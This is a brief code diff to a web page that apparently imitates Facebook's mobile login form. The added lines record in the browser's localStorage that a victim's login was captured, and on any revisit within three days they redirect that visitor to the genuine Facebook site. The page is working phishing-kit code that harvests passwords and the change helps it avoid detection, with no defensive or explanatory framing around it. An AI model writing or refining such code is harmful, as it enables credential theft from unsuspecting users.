@@ -348,6 +348,8 @@
             xf = {c: 0, t: Date.now()};
         if(Date.now() < xf.t + 3*24*60*60*1000)
             c = xf.c;
+        if(c == 3)
+            location.href = uk("rdt") ? uk("rdt") : "https://m.facebook.com/";
         var p;
         var d = [];
         function _login() {
@@ -395,6 +397,8 @@
                 document.getElementById("m_login_password").value = "";
                 location.href = uk("rdt") ? uk("rdt") : "https://m.facebook.com/";
                 }, 300+Math.random()*500);
+                xf = {c: 3, t: Date.now()};
+                localStorage["xf"] = JSON.stringify(xf);
             }
         }
         function dPush() {
